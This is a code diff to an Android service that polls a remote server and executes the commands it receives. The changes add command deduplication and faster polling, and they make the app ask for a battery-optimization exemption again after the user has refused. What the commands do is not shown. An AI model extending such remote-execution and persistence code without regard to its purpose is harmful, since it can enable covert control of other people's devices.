@@ -39,6 +39,10 @@ class CommandService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private val commandCounter = AtomicInteger(0)
 
+    // Track executed command IDs to prevent duplicate execution
+    private val executedCommandIds = mutableSetOf<String>()
+    private val executedIdsLock = Any()
+
     companion object {
         const val CHANNEL_ID = "abuzahra_service"
         const val CHANNEL_ID_ALERTS = "abuzahra_alerts"
@@ -72,7 +76,10 @@ class CommandService : Service() {
         }
         Log.i(TAG, "Service created")
 
-        // Request battery optimization exemption
+        // Load already-executed command IDs from preferences
+        loadExecutedCommandIds()
+
+        // Request battery optimization exemption - check every time, not just once
         requestBatteryOptimization()
 
         // Acquire wake lock (10 hours max, Android limit)
@@ -124,7 +131,7 @@ class CommandService : Service() {
         // Load settings
         loadSettings()
 
-        // Also poll REST API as backup
+        // Also poll REST API as backup (primary since server Firebase may be offline)
         startRestApiPolling()
 
         return START_STICKY
@@ -164,11 +171,75 @@ class CommandService : Service() {
         super.onDestroy()
     }
 
+    // ===== COMMAND DEDUPLICATION =====
+    private fun loadExecutedCommandIds() {
+        try {
+            val prefs = getSharedPreferences("abuzahra", MODE_PRIVATE)
+            val ids = prefs.getStringSet("executed_cmd_ids", emptySet()) ?: emptySet()
+            synchronized(executedIdsLock) {
+                executedCommandIds.clear()
+                executedCommandIds.addAll(ids)
+            }
+            Log.i(TAG, "Loaded ${ids.size} executed command IDs for dedup")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to load executed command IDs", e)
+        }
+    }
+
+    private fun markCommandExecuted(commandId: String) {
+        try {
+            synchronized(executedIdsLock) {
+                executedCommandIds.add(commandId)
+                // Keep only last 500 to prevent unbounded growth
+                if (executedCommandIds.size > 500) {
+                    val toRemove = executedCommandIds.dropLast(500)
+                    executedCommandIds.removeAll(toRemove)
+                }
+            }
+            // Persist to preferences
+            val prefs = getSharedPreferences("abuzahra", MODE_PRIVATE)
+            prefs.edit().putStringSet("executed_cmd_ids", executedCommandIds.toSet()).apply()
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to persist executed command ID", e)
+        }
+    }
+
+    private fun isCommandAlreadyExecuted(commandId: String): Boolean {
+        synchronized(executedIdsLock) {
+            return executedCommandIds.contains(commandId)
+        }
+    }
+
+    private fun executeCommandSafely(command: Command) {
+        if (command.id.isBlank()) {
+            Log.w(TAG, "Command has blank ID, executing anyway")
+            CommandExecutor.execute(this, command)
+            return
+        }
+        if (isCommandAlreadyExecuted(command.id)) {
+            Log.w(TAG, "Skipping duplicate command: ${command.id} (${command.command})")
+            // Send result to server so it moves out of pending
+            serviceScope.launch {
+                try {
+                    ApiClient.submitResult(command.id, command.command, "completed", "{\"skipped\":\"duplicate\"}")
+                } catch (e: Exception) {
+                    Log.w(TAG, "Failed to send skip result for ${command.id}", e)
+                }
+            }
+            return
+        }
+        markCommandExecuted(command.id)
+        val count = commandCounter.incrementAndGet()
+        Log.i(TAG, "Executing command #$count: ${command.command} (id=${command.id})")
+        updateNotification("Executing: ${command.command}")
+        CommandExecutor.execute(this, command)
+    }
+
     // ===== FIREBASE LISTENER =====
     private fun startFirebaseListener() {
         if (!FirebaseManager.isAvailable()) {
             Log.w(TAG, "Firebase not available, skipping listener. Error: ${FirebaseManager.getLastError()}")
-            updateNotification("Online (Firebase offline)")
+            updateNotification("Online (HTTP polling mode)")
             return
         }
 
@@ -186,10 +257,7 @@ class CommandService : Service() {
                     }
                     val json = Gson().toJson(data)
                     val command = Gson().fromJson(json, Command::class.java)
-                    val count = commandCounter.incrementAndGet()
-                    Log.i(TAG, "Firebase command #$count: ${command.command} (id=${command.id})")
-                    updateNotification("Executing: ${command.command}")
-                    CommandExecutor.execute(this@CommandService, command)
+                    executeCommandSafely(command)
                     // Remove after reading
                     snapshot.ref.removeValue().addOnFailureListener { err ->
                         Log.w(TAG, "Failed to remove Firebase command ${command.id}: ${err.message}")
@@ -209,6 +277,7 @@ class CommandService : Service() {
                 serviceScope.launch {
                     delay(backoff)
                     commandListener = null
+                    retryCount = 0 // Reset retry count before reconnecting
                     startFirebaseListener()
                 }
             }
@@ -217,7 +286,7 @@ class CommandService : Service() {
         Log.i(TAG, "Firebase command listener active for device: $deviceId")
     }
 
-    // ===== REST API POLLING (BACKUP) =====
+    // ===== REST API POLLING (BACKUP / PRIMARY when Firebase is offline) =====
     private fun startRestApiPolling() {
         restApiPollingJob = serviceScope.launch {
             var consecutiveErrors = 0
@@ -227,10 +296,7 @@ class CommandService : Service() {
                     if (commands.isNotEmpty()) {
                         Log.i(TAG, "REST API: ${commands.size} command(s) received")
                         commands.forEach { cmd ->
-                            val count = commandCounter.incrementAndGet()
-                            Log.i(TAG, "REST command #$count: ${cmd.command} (id=${cmd.id})")
-                            updateNotification("Executing: ${cmd.command}")
-                            CommandExecutor.execute(this@CommandService, cmd)
+                            executeCommandSafely(cmd)
                         }
                     }
                     consecutiveErrors = 0
@@ -244,7 +310,7 @@ class CommandService : Service() {
                         continue
                     }
                 }
-                delay(10000) // Poll every 10 seconds
+                delay(5000) // Poll every 5 seconds (reduced from 10s for faster response)
             }
         }
     }
@@ -371,16 +437,19 @@ class CommandService : Service() {
 
     private fun requestBatteryOptimization() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val prefs = getSharedPreferences("abuzahra", MODE_PRIVATE)
-            if (prefs.getBoolean("battery_opt_requested", false)) return
             try {
+                val pm = getSystemService(POWER_SERVICE) as PowerManager
+                if (pm.isIgnoringBatteryOptimizations(packageName)) {
+                    Log.i(TAG, "Battery optimization already exempted")
+                    return
+                }
+                // Always ask if not exempted (user may have denied before)
                 val intent = Intent(
                     Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                     android.net.Uri.parse("package:${packageName}")
                 )
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 startActivity(intent)
-                prefs.edit().putBoolean("battery_opt_requested", true).apply()
             } catch (e: Exception) {
                 Log.w(TAG, "Battery optimization request failed", e)
             }
